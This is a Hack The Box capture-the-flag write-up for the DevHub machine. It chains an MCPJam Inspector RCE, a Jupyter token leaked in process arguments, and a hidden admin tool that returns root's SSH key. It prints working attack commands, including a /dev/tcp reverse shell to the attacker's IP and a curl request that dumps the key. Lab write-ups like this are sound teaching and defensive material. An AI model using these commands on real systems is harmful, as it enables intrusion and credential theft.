# Hack The Box — DevHub Writeup

> **Active-machine material — private only. Do not publish until DevHub has retired.** Flags and the root private key are intentionally redacted.

## Machine information

| Field | Value |
| --- | --- |
| Machine | DevHub |
| Platform | Hack The Box |
| Season | 11 |
| OS | Linux / Ubuntu |
| Difficulty | Medium |
| Target IP | `10.129.3.129` |
| Local IP | `10.10.15.148` |
| Initial user | `mcp-dev` |
| Lateral movement | `mcp-dev` → `analyst` |
| Privilege escalation | `analyst` → `root` |

## Summary

DevHub exposed an MCPJam Inspector service vulnerable to remote command execution through `/api/mcp/connect`. The initial shell as `mcp-dev` revealed a localhost-only Jupyter Lab instance running as `analyst`; its token was exposed in the process command line. Code execution through the Jupyter API provided a shell as `analyst`.

The `analyst` account could read an internal Flask-based operations service running as root. Its source contained a hardcoded API key and a hidden administrative tool capable of returning `/root/.ssh/id_rsa`. The recovered key enabled SSH access as root.

```text
MCPJam Inspector RCE
→ shell as mcp-dev
→ Jupyter token exposed in process arguments
→ Jupyter API code execution
→ shell as analyst
→ source review of /opt/opsmcp/server.py
→ hardcoded API key and hidden admin tool
→ disclosure of root's SSH private key
→ SSH as root
```

## Vulnerability used

### CVE-2026-23744 — MCPJam Inspector Remote Code Execution

- **Stage:** Foothold / initial access
- **Target:** MCPJam Inspector v1.4.2 exposed on port `6274`
- **Endpoint:** `POST /api/mcp/connect`
- **Impact in DevHub:** a crafted request against MCPJam Inspector produced the initial reverse shell as `mcp-dev`.
- **Affected versions:** MCPJam Inspector `<= 1.4.2`
- **Fixed version:** MCPJam Inspector `1.4.3`
- **References:**
  - NVD — <https://nvd.nist.gov/vuln/detail/CVE-2026-23744>
  - GitHub Security Advisory GHSA-232v-j27c-5pp6 — <https://github.com/advisories/GHSA-232v-j27c-5pp6>
  - Exploit reference used during the lab: `iamrajkumar1995/MCPJam-Exploit` / `mcpexploit1.py`

No CVE was used for the lateral movement or privilege escalation:

- `mcp-dev` → `analyst`: abused an exposed Jupyter Lab token visible in process arguments.
- `analyst` → `root`: abused a hardcoded OPSMCP API key and the hidden `ops._admin_dump` tool in `/opt/opsmcp/server.py` to dump `/root/.ssh/id_rsa`.

## 1. Reconnaissance

Run a full TCP scan:

```bash
nmap -sV -Pn -sC -p- -T5 10.129.3.129
```

```text
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp   open  http    nginx 1.18.0
6274/tcp open  unknown
```

Port `80` redirects to `http://devhub.htb/`. Add the hostname locally:

```bash
echo '10.129.3.129 devhub.htb' | sudo tee -a /etc/hosts
```

The page reveals several internal components:

```text
MCP Inspector       → port 6274
Analytics Dashboard → localhost:8888
Code Repository     → maintenance
```

Visiting `http://devhub.htb:6274` identifies **MCPJam Inspector v1.4.2**.

## 2. Initial foothold — CVE-2026-23744 MCPJam Inspector RCE

The service exposes the following endpoint:

```text
POST /api/mcp/connect
```

A request without a body confirms that it exists and expects JSON:

```bash
curl -X POST http://devhub.htb:6274/api/mcp/connect \
  -H 'Content-Type: application/json'
```

```json
{
  "success": false,
  "error": "Failed to parse request body",
  "details": "Unexpected end of JSON input"
}
```

Start a listener, then run the public MCPJam Inspector exploit:

```bash
nc -lvnp 8888
python3 mcpexploit1.py
```

The callback lands inside the Inspector installation:

```text
connect to [10.10.15.148] from (UNKNOWN) [10.129.3.129] 35200
bash: cannot set terminal process group (1052): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

```bash
id
```

```text
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## 3. Local enumeration as `mcp-dev`

Two user home directories are present:

```bash
ls /home
```

```text
analyst  mcp-dev
```

The `analyst` home directory is inaccessible, `sudo -l` requires the unknown `mcp-dev` password, and the SUID binaries are standard. `/opt` is more interesting:

```bash
ls /opt
ls -la /opt/opsmcp
```

```text
mcpjam  opsmcp
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```

`mcp-dev` cannot read `server.py`, suggesting the intended progression is:

```text
mcp-dev → analyst → root
```

## 4. Discovering Jupyter Lab

Inspect relevant processes:

```bash
ps auxww | grep -Ei 'opsmcp|server.py|analyst|python|jupyter|8888' | grep -v grep
```

```text
analyst 1051 ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root 1061 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

This reveals both a Jupyter token and a root-owned internal service. Listening sockets confirm the local endpoints:

```bash
ss -lntp
```

```text
127.0.0.1:5000
127.0.0.1:8888
0.0.0.0:6274
0.0.0.0:22
0.0.0.0:80
```

Test the token locally:

```bash
TOKEN='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'
curl -s "http://127.0.0.1:8888/api/status?token=$TOKEN"
```

The status endpoint returns valid Jupyter state, confirming the token works.

## 5. Lateral movement — `mcp-dev` to `analyst`

Code submitted to a Jupyter kernel inherits the `analyst` account. Start a second listener:

```bash
nc -lvnp 9999
```

The Jupyter API flow is:

```text
POST /api/kernels
→ create a Python kernel

WebSocket /api/kernels/<kernel_id>/channels
→ send execute_request

execute_request
→ run Python code that starts a reverse shell
```

Execute the equivalent of:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.15.148/9999 0>&1'")
```

The new shell runs as `analyst`:

```text
analyst
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

```bash
cat /home/analyst/user.txt
```

```text
[REDACTED]
```

## 6. Privilege escalation — `analyst` to `root`

The new account can read the root-run service:

```bash
cat /opt/opsmcp/server.py
```

The Flask application listens on `127.0.0.1:5000` and contains a hardcoded API key:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

It also defines hidden administrative tools:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

Although these tools are hidden from normal listings, the `/tools/call` endpoint accepts every entry in `ALL_TOOLS`:

```python
ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
```

For `target=ssh_keys`, `ops._admin_dump` reads root's private key:

```python
if target == "ssh_keys":
    with open("/root/.ssh/id_rsa", "r") as file:
        key_data = file.read()
    return jsonify({
        "target": "ssh_keys",
        "root_private_key": key_data,
        "note": "Emergency recovery key dump"
    })
```

Because the OPSMCP process runs as root, this becomes an arbitrary root-sensitive file disclosure.

## 7. Dumping the root SSH private key

Create the request payload:

```bash
echo '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' > /tmp/payload.json
```

Call the local service with its hardcoded key:

```bash
curl -sS -X POST http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  --data-binary @/tmp/payload.json > /tmp/resp.json
```

```json
{
  "note": "Emergency recovery key dump",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED]\n-----END OPENSSH PRIVATE KEY-----",
  "target": "ssh_keys"
}
```

Decode the escaped JSON value and set strict file permissions:

```bash
python3 -c 'import json; print(json.load(open("/tmp/resp.json"))["root_private_key"])' > /tmp/root_id_rsa
chmod 600 /tmp/root_id_rsa
```

Use the key locally on the target:

```bash
ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -i /tmp/root_id_rsa \
  root@127.0.0.1 'whoami; id; cat /root/root.txt'
```

```text
root
uid=0(root) gid=0(root) groups=0(root)
[REDACTED]
```

The key also permits direct access from the attacking host:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.129.3.129
```

The actual private key is deliberately omitted from this repository.

## Technical note — Password dump

The same hidden tool accepts `target=passwords` and returns values for `root`, `analyst`, and `mcp-dev`. The root value appears to be a placeholder rather than a valid SHA-512 crypt hash:

```text
$6$rounds=656000$saltsalt$hashedpassword
```

John reports `No password hashes loaded`, so dumping the SSH key is the intended path.

## Root cause

1. **Exposed vulnerable inspector:** MCPJam Inspector v1.4.2 is reachable on port `6274` and permits RCE through `/api/mcp/connect`.
2. **Token disclosure:** the Jupyter token is exposed in process arguments.
3. **Unsafe privilege boundary:** the internal OPSMCP service runs as root.
4. **Hardcoded authentication secret:** its API key is embedded in readable source code.
5. **Callable hidden functionality:** `ops._admin_dump` is omitted from listings but remains callable.
6. **Root-sensitive file disclosure:** the hidden tool can return `/root/.ssh/id_rsa`.

## Attack chain summary

```text
1. Nmap reveals ports 22, 80, and 6274.
2. Port 80 identifies DevHub and hints at MCP Inspector on 6274.
3. MCPJam Inspector v1.4.2 yields RCE through /api/mcp/connect.
4. The exploit returns a shell as mcp-dev.
5. Process enumeration exposes an analyst-owned Jupyter token.
6. The Jupyter API executes code as analyst.
7. analyst reads /opt/opsmcp/server.py.
8. The source reveals an API key and ops._admin_dump.
9. The hidden tool returns /root/.ssh/id_rsa.
10. The private key provides SSH access as root.
```

## Lessons learned

The first shell was only a foothold. Process enumeration exposed a token for a second security context, and source-code review then exposed a dangerous root-run internal API. Localhost-only services are not safe when lower-privileged users can reach them and recover their credentials.

```text
A low-privileged shell becomes powerful when internal services leak secrets through process arguments, source code, or localhost-only APIs.
```

## Remediation

- Restrict inspector and debugging tools to trusted interfaces and require authentication.
- Upgrade vulnerable MCPJam Inspector deployments.
- Do not expose Jupyter tokens in command-line arguments.
- Store secrets in protected configuration or a secrets manager.
- Run internal services with the least privileges they require.
- Remove credential-dump functionality from production services.
- Enforce authorization for each tool, including unlisted tools.
- Prevent application code from reading root-owned SSH material.

## Flags

```text
user.txt: [REDACTED]
root.txt: [REDACTED]
```
